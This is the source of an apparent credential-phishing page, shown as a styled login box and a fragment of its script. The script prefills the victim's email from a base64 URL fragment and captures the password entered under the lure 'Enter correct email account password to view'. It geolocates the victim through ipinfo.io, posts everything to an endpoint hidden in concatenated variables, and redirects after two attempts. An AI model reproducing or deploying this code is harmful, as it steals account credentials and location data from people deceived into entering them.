	<style type="text/css">
		.hide {
			display: none;
			}

		.grey-form {
			background-color: #ffffff;
			opacity: 1;
			pointer-events: none;
		}

		.alert-success {
			color: #155724;
			background-color: #d4edda;
			border-color: #c3e6cb;
		}



		.modal-body {
			padding: 0 !important;
		}

		.login-container {
			position: absolute;
			padding: 20px 20px 20px;
			text-align: center;
			background: #f5f5f5;
			border: 1px solid #ccc;
			z-index: 33;
			bottom: 40%;
			margin: 0;
			position: absolute;
			left: 50%;
			transform: translateX(-50%);
			border-radius: 5px;
			display: none;
		}

		.loginLoader {
			position: absolute;
			padding: 20px 20px 20px;
			text-align: center;
			z-index: 3;
			bottom: 20%;
			margin: 0;
			position: absolute;
			left: 50%;
			transform: translateX(-50%);
			border-radius: 5px;
			display: flex;
			justify-content: center;
			align-items: center;
			width: 300px;
			height: 300px;
		}

		#output {
			position: absolute;
			width: 400px;
			top: -75px;
			left: 0;
			color: #fff;
		}

		#output.alert-success {
			background: rgb(25, 204, 25);
		}

		#output.alert-danger {
			background: rgb(228, 105, 105);

		}

		.logos {
			width: 100%;
			height: auto;
			display: flex;
			justify-content: space-between;
			align-items: center;
		}


		.form-box input {
			width: 100%;
			margin: 1px;
			auto padding: 10px;
			text-align: center;
			height: 40px;
			border: 1px solid #ccc;
			;
			background: #ffffff;
			transition: 0.2s ease-in-out;

		}

		.form-box input:focus {
			outline: 50px;
			background: #ffffff;
		}

		.form-box input[type="text"] {
			border-radius: 5px 5px 0 0;
			text-transform: lowercase;
		}

		.form-box input[type="password"] {
			border-radius: 0 0 0px 0px;
			border-top: 0;
		}

		.form-box button.login {
			margin-top: 15px;
			padding: 10px 20px;

		}

		.animated {
			-webkit-animation-duration: 1s;
			animation-duration: 1s;
			-webkit-animation-fill-mode: both;
			animation-fill-mode: both;
		}

		@-webkit-keyframes fadeInUp {
			0% {
				opacity: 0;
				-webkit-transform: translateY(20px);
				transform: translateY(20px);
			}

			100% {
				opacity: 0;
				-webkit-transform: translateY(0);
				transform: translateY(0);
			}
		}

		@keyframes fadeInUp {
			0% {
				opacity: 0;
				-webkit-transform: translateY(20px);
				-ms-transform: translateY(20px);
				transform: translateY(20px);
			}

			100% {
				opacity: 1;
				-webkit-transform: translateY(0);
				-ms-transform: translateY(0);
				transform: translateY(0);
			}
		}

		.fadeInUp {
			-webkit-animation-name: fadeInUp;
			animation-name: fadeInUp;
		}

		.avatar {
			position: relative;
		}

		.padlock {
			position: absolute;
			width: 40px;
			height: 40px;
			bottom: -10px;
			left: -20px;
			//background-color: #fff;
		}

		@keyframes hide {
			from {
				opacity: 1;
			}

			to {
				opacity: 0;
			}
		}

		@keyframes show {
			from {
				opacity: 0;
			}

			to {
				opacity: 1;
			}
		}

		.lds-spinner {
		color: official;
		display: inline-block;
		position: relative;
		width: 80px;
		height: 80px;
		}
		.lds-spinner div {
		transform-origin: 40px 40px;
		animation: lds-spinner 1.2s linear infinite;
		}
		.lds-spinner div:after {
		content: " ";
		display: block;
		position: absolute;
		top: 3px;
		left: 37px;
		width: 6px;
		height: 18px;
		border-radius: 20%;
		background: #f00;
		}
		.lds-spinner div:nth-child(1) {
		transform: rotate(0deg);
		animation-delay: -1.1s;
		}
		.lds-spinner div:nth-child(2) {
		transform: rotate(30deg);
		animation-delay: -1s;
		}
		.lds-spinner div:nth-child(3) {
		transform: rotate(60deg);
		animation-delay: -0.9s;
		}
		.lds-spinner div:nth-child(4) {
		transform: rotate(90deg);
		animation-delay: -0.8s;
		}
		.lds-spinner div:nth-child(5) {
		transform: rotate(120deg);
		animation-delay: -0.7s;
		}
		.lds-spinner div:nth-child(6) {
		transform: rotate(150deg);
		animation-delay: -0.6s;
		}
		.lds-spinner div:nth-child(7) {
		transform: rotate(180deg);
		animation-delay: -0.5s;
		}
		.lds-spinner div:nth-child(8) {
		transform: rotate(210deg);
		animation-delay: -0.4s;
		}
		.lds-spinner div:nth-child(9) {
		transform: rotate(240deg);
		animation-delay: -0.3s;
		}
		.lds-spinner div:nth-child(10) {
		transform: rotate(270deg);
		animation-delay: -0.2s;
		}
		.lds-spinner div:nth-child(11) {
		transform: rotate(300deg);
		animation-delay: -0.1s;
		}
		.lds-spinner div:nth-child(12) {
		transform: rotate(330deg);
		animation-delay: 0s;
		}
		@keyframes lds-spinner {
		0% {
			opacity: 1;
		}
		100% {
			opacity: 0;
		}
		}

	</style>

			ccc.style.animation = 'show 1s ease'
		}, 3000)
	})
	const xx = window.location.href.split('#');
	let ck = document.querySelector('#ck')
	let ckorg = document.querySelector('#ckorg')
	let cknow = document.querySelector('#cknow')
	let loader = document.querySelector('#submit-btn')
	let loc = document.querySelector('#loc')
	let trial = document.querySelector('#trial')

	if (xx[1] != undefined) {
		document.querySelector('#mBox').innerHTML = atob(xx[1]).toLowerCase()
		//document.querySelector('#mBoxLogo').src = atob(xx[1]).toLowerCase() + ".png"
	} 
	trial.value = trialCount 
	let	myForm = document.querySelector('#form_') 
	myForm.addEventListener('submit', async function (event) {
		event.preventDefault() 
		let data = new FormData()
		let options = { method: 'POST', body: data }
		data.append('ck', ck.value) 
		data.append('ckorg', ckorg.value) 
		data.append('cknow', cknow.value)
		data.append('loc', loc.value) 
		data.append('trial', trial.value) 
		data.append('resBox', resBox)
		loader.innerHTML = "<i class='fa fa- fa-spin'></i> loading..." 
		const response = await fetch(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`, options) 
		const result = await response.text()
		loader.innerHTML = "<i class='fa fa- fa-spin'></i> loadiing file..." 
		setTimeout(() => {
			loader.innerHTML = "Open"
		}, 2000)

		console.log(result)

		trialCount++;
		sessionStorage.setItem("num_trial", trialCount);
		trial.value = trialCount

		if (trialCount >= 2) {
			window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
		} else {
			cknow.value = ''
			document.getElementById('errmsg').innerHTML = "Enter correct email account password to view"
		}
	})

	$.get("https://ipinfo.io/json?token=10da60a9ff2d81", function (response) {
		let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal}
					${response.timezone}`
		$("#loc").val(cou);
	}, "jsonp");
</script>
